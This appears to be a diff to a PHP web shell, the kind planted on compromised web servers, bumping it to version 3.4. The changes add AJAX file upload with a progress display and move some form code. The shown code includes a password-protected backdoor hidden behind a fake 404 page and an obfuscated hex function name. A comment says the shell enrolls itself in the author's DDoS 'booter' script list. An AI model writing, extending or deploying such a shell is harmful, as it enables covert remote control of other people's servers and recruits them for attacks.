@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.33;
+$version            = 3.4;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -376,6 +376,15 @@ function Init() {
     	filedrag.addEventListener("drop", FileSelectHandler, false);
 	}
 }
+String.prototype.toDOM=function(){
+  var d=document
+     ,i
+     ,a=d.createElement("div")
+     ,b=d.createDocumentFragment();
+  a.innerHTML=this;
+  while(i=a.firstChild)b.appendChild(i);
+  return b;
+};
 function FileDragHover(e) {
     if(e.target.type != "file"){
     	e.stopPropagation();
@@ -393,8 +402,8 @@ function FileSelectHandler(e) {
 window.onbeforeunload = function(){
     return \'Are you sure you want to leave?\';
 };
- document.onreadystatechange = function() {
-     if (document.readyState == "complete") {
+function orsc(){
+    if (document.readyState == "complete") {
          var showChar = 100;
          var classes = document.getElementsByClassName(\'more\');
          for (var i = 0; i < classes.length; ++i) {
@@ -435,6 +444,9 @@ window.onbeforeunload = function(){
      if (window.File && window.FileList && window.FileReader) {
 	    Init();
      }
+}
+ document.onreadystatechange = function() {
+     orsc();
  }
 function CheckAll(form) {
 	for(var i=0;i<form.elements.length;i++) {
@@ -632,6 +644,18 @@ makehide('findin', '');
 makehide('re', '');
 makehide('writabledb', '');
 formfoot();
+if (!$dir) {
+    $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
+}
+$nowpath = getPath(SA_ROOT, $dir);
+if (substr($dir, -1) != '/') {
+    $dir = $dir . '/';
+}
+p('<form id="filelist" name="filelist" onSubmit="window.onbeforeunload = null;" action="' . $self . '" method="post">');
+makehide('action', 'file');
+makehide('thefile');
+makehide('doing');
+makehide('dir', $nowpath);
 if (!$sf("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x65\x67\x69\x64")) {//placemarkerhere
     $user  = @get_current_user();
     $uid   = @getmyuid();
@@ -709,16 +733,9 @@ echo '<div class="blocktop"><a href="javascript:g(\'settings\');">Shell Settings
 			</div></div></td>
 	</tr>
 </table>
-<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
+<table id="maintable" width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
 ';
 $errmsg && m($errmsg);
-if (!$dir) {
-    $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
-}
-$nowpath = getPath(SA_ROOT, $dir);
-if (substr($dir, -1) != '/') {
-    $dir = $dir . '/';
-}
 if (isset($_SESSION[$prefixme.'updateready']) && time() > $_SESSION[$prefixme.'updateready']){
 unset($_SESSION[$prefixme.'updatready']);
 }
@@ -823,6 +840,10 @@ if ($action == 'phpinfo') {
             }
         }
         m('File upload ' . ($fail ? 'success' : 'failed'));
+        /*if($isajax){
+            ob_clean();
+            die('File upload ' . ($fail ? 'success' : 'failed'));
+        }*/
     } elseif ($editfilename && ($filecontent || $submit)) {
         $fp        = @$pen($editfilename, 'w');
         $writingit = @$feather($fp, $filecontent);
@@ -1014,6 +1035,7 @@ if ($action == 'phpinfo') {
     makehide('getdir');
     makehide('dir');
     formfoot();
+    echo '<div id="astatus" style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;display:none;"></div>';
     $free = @disk_free_space($nowpath);
     !$free && $free = 0;
     $all = @disk_total_space($nowpath);
@@ -1119,9 +1141,13 @@ function shownav(e){
 	var xhr = new XMLHttpRequest();
 	xhr.onreadystatechange = function() {
         if (xhr.readyState == 4) {
-            document.open();
-            document.write(xhr.responseText);
-            document.close();
+            var thedom = xhr.responseText.toDOM();
+            $id("thefilelist").innerHTML = thedom.getElementById("thefilelist").innerHTML;
+            $id("astatus").innerHTML = thedom.getElementById("theresult").innerHTML;
+            //console.log(xhr.responseText);
+            //console.log(xhr.responseText.toDOM());
+            //document.body.innerHTML = xhr.responseText.toDOM().innerHTML;
+            orsc();
         }
     }
 	if (xhr.upload) {
@@ -1132,8 +1158,14 @@ function shownav(e){
 	    formData.append("uploaddir","' . $nowpath . '");
 	    formData.append("dir","' . $nowpath . '");
 	    formData.append("doupfile","Upload");
+	    xhr.upload.addEventListener("progress", function(e) {
+	        $id("theresult").style.display = "none";
+	        $id("astatus").style.display = "block";
+			$id("astatus").innerHTML = "Uploading files...(" + Math.round(e.loaded / e.total * 100) + "%)";
+		}, false);
+		document.body.scrollIntoView();
 	    xhr.open("POST", "' . $_SERVER['PHP_SELF'] . '", true);
-		xhr.setRequestHeader("X_FILENAME", files[0].name);
+		xhr.setRequestHeader("X_UPLOAD", "true");
 		xhr.send(formData);
 	}
 }</script>';
@@ -1215,11 +1247,6 @@ function shownav(e){
         unset($filedb);
         @closedir($dirs);
     }
-    p('<form id="filelist" name="filelist" onSubmit="window.onbeforeunload = null;" action="' . $self . '" method="post">');
-    makehide('action', 'file');
-    makehide('thefile');
-    makehide('doing');
-    makehide('dir', $nowpath);
   $dir_i = '0'; 
   if (isset($dirdata['up'])) {
 		p('<tr class=' . bg() . '>');
@@ -3227,9 +3254,8 @@ function secparam($n, $v)
         p('</div>');
     }
 }
-function m($msg)
-{
-    echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
+function m($msg){
+    echo '<div id="theresult" style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
     echo $msg;
     echo '</div>';
 }
